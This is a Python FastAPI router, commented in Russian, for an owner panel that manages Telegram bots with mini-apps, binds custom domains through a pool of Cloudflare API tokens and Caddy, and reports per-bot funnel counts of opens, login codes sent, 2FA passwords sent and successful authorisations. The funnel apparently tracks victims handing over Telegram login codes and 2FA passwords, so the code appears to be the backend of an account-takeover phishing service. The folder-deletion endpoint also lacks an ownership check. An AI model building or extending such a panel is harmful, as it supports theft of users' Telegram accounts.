"""API-роуты панели владельца бота (/api/panel/*).

Все эндпоинты тонкие обёртки над database.py. Проверка пользователя через
verify_panel_user → X-Telegram-Init-Data.
"""
from __future__ import annotations

import asyncio
import logging
from typing import Any

from fastapi import APIRouter, Body, Depends, HTTPException

import config
from database import (
    add_bot,
    add_folder,
    cf_pool_add,
    cf_pool_purge_all,
    cf_pool_stats,
    delete_bot,
    delete_folder,
    get_auth_event_counts,
    get_bot,
    get_folders,
    get_launch_stats,
    get_miniapp_launch_count,
    get_owner_templates,
    get_template,
    get_user_bots,
    pending_bot_clear,
    pending_bot_get,
    pending_bot_set,
    token_exists,
    update_bot_field,
    user_domains_list,
    user_has_ssl_domain,
)
from web.panel_auth import require_admin, verify_panel_user

logger = logging.getLogger(__name__)

router = APIRouter(prefix="/api/panel", tags=["panel"])


# ===== profile =====

@router.get("/me")
async def me(user: dict = Depends(verify_panel_user)) -> dict:
    return user


# ===== bots =====

def _funnel(tg_id: int | None) -> dict:
    """4 счётчика воронки. Берём из существующих таблиц без миграций."""
    if not tg_id:
        return {"opens": 0, "code_sent": 0, "twofa_sent": 0, "auths": 0}
    opens = get_miniapp_launch_count(tg_id)
    events = get_auth_event_counts(tg_id)
    return {
        "opens": opens,
        "code_sent": events.get("code_sent", 0),
        "twofa_sent": events.get("twofa_sent", 0),
        "auths": events.get("auth_ok", 0),
    }


def _bot_brief(bot: dict) -> dict:
    return {
        "id": bot["id"],
        "username": bot.get("username") or "",
        "tg_id": bot.get("tg_id"),
        "folder_id": bot.get("folder_id"),
        "guard_enabled": bool(bot.get("guard_enabled")),
        "miniapp_enabled": bool(bot.get("miniapp_enabled")),
        "template_id": bot.get("template_id"),
        "funnel": _funnel(bot.get("tg_id")),
    }


@router.get("/bots")
async def list_bots(
    folder_id: int | None = None, user: dict = Depends(verify_panel_user)
) -> list[dict]:
    rows = get_user_bots(user["id"], folder_id=folder_id)
    return [_bot_brief(b) for b in rows]


def _ensure_owner(bot_id: int, user_id: int) -> dict:
    bot = get_bot(bot_id)
    if not bot or bot["owner_id"] != user_id:
        raise HTTPException(404, "bot not found")
    return bot


@router.get("/bots/{bot_id}")
async def get_bot_card(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    bot = _ensure_owner(bot_id, user["id"])
    stats = get_launch_stats(bot["tg_id"]) if bot.get("tg_id") else {}
    return {
        **_bot_brief(bot),
        "welcome_message": bot.get("welcome_message") or "",
        "auto_approve": bool(bot.get("auto_approve")),
        "launch_stats": stats,
    }


@router.patch("/bots/{bot_id}")
async def patch_bot(
    bot_id: int,
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    _ensure_owner(bot_id, user["id"])
    allowed = {
        "guard_enabled", "auto_approve", "welcome_message",
        "folder_id", "template_id", "miniapp_enabled",
    }
    for k, v in payload.items():
        if k in allowed:
            update_bot_field(bot_id, k, v)
    return _bot_brief(get_bot(bot_id))


@router.delete("/bots/{bot_id}")
async def remove_bot(bot_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    _ensure_owner(bot_id, user["id"])
    delete_bot(bot_id)
    return {"ok": True}


# ===== drafts (создания) =====

@router.get("/drafts")
async def get_drafts(user: dict = Depends(verify_panel_user)) -> dict:
    """Текущий незавершённый бот + статус домена/SSL."""
    pending = pending_bot_get(user["id"])
    has_ssl = user_has_ssl_domain(user["id"])
    domains = user_domains_list(user["id"])
    return {
        "pending_token": pending,                        # dict|None
        "has_ssl_domain": has_ssl,
        "domains": domains,
    }


@router.post("/drafts/token")
async def submit_token(
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    """Сохранить токен. Валидирует через getMe."""
    from aiogram import Bot
    from aiogram.exceptions import TelegramUnauthorizedError

    token = (payload.get("token") or "").strip()
    if not token:
        raise HTTPException(400, "token required")
    if token_exists(token):
        raise HTTPException(409, "token already used")
    b = Bot(token=token)
    try:
        me = await b.get_me()
    except TelegramUnauthorizedError:
        raise HTTPException(400, "invalid token")
    finally:
        await b.session.close()

    pending_bot_set(user["id"], token, me.username, me.id)
    return {"username": me.username, "tg_id": me.id}


@router.post("/drafts/finalize")
async def finalize_bot(user: dict = Depends(verify_panel_user)) -> dict:
    """Создать бота, если есть и токен, и SSL-домен."""
    pending = pending_bot_get(user["id"])
    if not pending:
        raise HTTPException(400, "no token; submit token first")
    if not user_has_ssl_domain(user["id"]):
        raise HTTPException(400, "no domain with ready SSL")

    bot_id = add_bot(
        owner_id=user["id"],
        token=pending["token"],
        username=f"@{pending['username']}",
        tg_id=pending["tg_id"],
    )
    pending_bot_clear(user["id"])

    # Поднимаем рантайм дочернего бота.
    try:
        from child.runtime import get_runtime
        await get_runtime().start_bot_db(get_bot(bot_id))
    except Exception:
        logger.exception("start_bot_db failed for %s", bot_id)

    return _bot_brief(get_bot(bot_id))


# ===== folders =====

@router.get("/folders")
async def list_folders(user: dict = Depends(verify_panel_user)) -> list[dict]:
    return get_folders(user["id"])


@router.post("/folders")
async def create_folder(
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    name = (payload.get("name") or "").strip()
    if not name:
        raise HTTPException(400, "name required")
    fid = add_folder(user["id"], name)
    return {"id": fid, "name": name}


@router.delete("/folders/{folder_id}")
async def remove_folder(folder_id: int, user: dict = Depends(verify_panel_user)) -> dict:
    delete_folder(folder_id)
    return {"ok": True}


# ===== templates =====

@router.get("/templates")
async def list_templates(user: dict = Depends(verify_panel_user)) -> list[dict]:
    rows = get_owner_templates(user["id"])
    return [
        {"id": t["id"], "name": t["name"], "kind": t.get("kind", "standard")}
        for t in rows
    ]


@router.get("/templates/{template_id}")
async def get_template_full(
    template_id: int, user: dict = Depends(verify_panel_user)
) -> dict:
    t = get_template(template_id)
    if not t or t["owner_id"] != user["id"]:
        raise HTTPException(404, "template not found")
    return t


# ===== domains =====

@router.get("/domains")
async def list_my_domains(user: dict = Depends(verify_panel_user)) -> list[dict]:
    return user_domains_list(user["id"])


@router.post("/domains")
async def bind_domain(
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    """Запустить привязку домена. Возвращает NS-серверы CF."""
    from database import cf_pool_get_for_user, user_domain_add
    from domain_flow import (
        CaddyReloadError, CFError, CFZoneOwnedByOtherError,
        DomainAlreadyExistsError, DomainInvalidError,
        add_domain_to_caddy_with_token, cf_add_a_record,
        cf_create_or_get_zone, cf_get_ns_servers,
        cf_set_domain_defaults, cf_set_ssl_mode,
        reload_caddy, remove_domain_from_caddy,
    )

    domain = (payload.get("domain") or "").strip().lower()
    if not domain:
        raise HTTPException(400, "domain required")
    account = cf_pool_get_for_user(user["id"])
    if not account:
        raise HTTPException(503, "CF pool empty — ask admin to add tokens")

    def _do() -> list[str]:
        zone_id = cf_create_or_get_zone(domain, account["api_token"])
        cf_add_a_record(zone_id, domain, config.DOMAIN_SERVER_IP, account["api_token"])
        cf_set_ssl_mode(zone_id, "strict", account["api_token"])
        cf_set_domain_defaults(zone_id, account["api_token"])
        ns = cf_get_ns_servers(zone_id, account["api_token"])
        add_domain_to_caddy_with_token(
            domain, config.DOMAIN_CADDYFILE,
            account["api_token"], target=config.DOMAIN_TARGET,
        )
        try:
            reload_caddy(
                config.DOMAIN_CADDY_EXE, config.DOMAIN_CADDYFILE,
                admin_url=config.DOMAIN_CADDY_ADMIN_URL or None,
            )
        except CaddyReloadError:
            try:
                remove_domain_from_caddy(domain, config.DOMAIN_CADDYFILE)
            except Exception:
                pass
            raise
        return ns

    try:
        ns = await asyncio.to_thread(_do)
    except DomainInvalidError:
        raise HTTPException(400, "invalid domain")
    except DomainAlreadyExistsError:
        raise HTTPException(409, "already bound")
    except CFZoneOwnedByOtherError:
        raise HTTPException(409, "zone owned by another CF account")
    except (CFError, CaddyReloadError) as e:
        raise HTTPException(500, str(e)[:300])

    user_domain_add(user["id"], domain, account["id"])
    return {"domain": domain, "ns_servers": ns}


# ===== admin =====

@router.get("/admin/cf-pool")
async def admin_pool_stats(user: dict = Depends(verify_panel_user)) -> dict:
    await require_admin(user)
    return cf_pool_stats()


@router.post("/admin/cf-pool")
async def admin_pool_add(
    payload: dict = Body(...),
    user: dict = Depends(verify_panel_user),
) -> dict:
    await require_admin(user)
    raw = (payload.get("token") or "").strip()
    if not raw:
        raise HTTPException(400, "token required")
    if not raw.isascii():
        raise HTTPException(400, "token must be ASCII")
    added = cf_pool_add(email=None, api_token=raw, label=payload.get("label"))
    try:
        from cf_pool_loader import append_token_to_json
        append_token_to_json(raw, label=payload.get("label"))
    except Exception:
        pass
    return {"added": added, **cf_pool_stats()}


@router.delete("/admin/cf-pool")
async def admin_pool_wipe(user: dict = Depends(verify_panel_user)) -> dict:
    await require_admin(user)
    removed = cf_pool_purge_all()
    return {"removed": removed, **cf_pool_stats()}
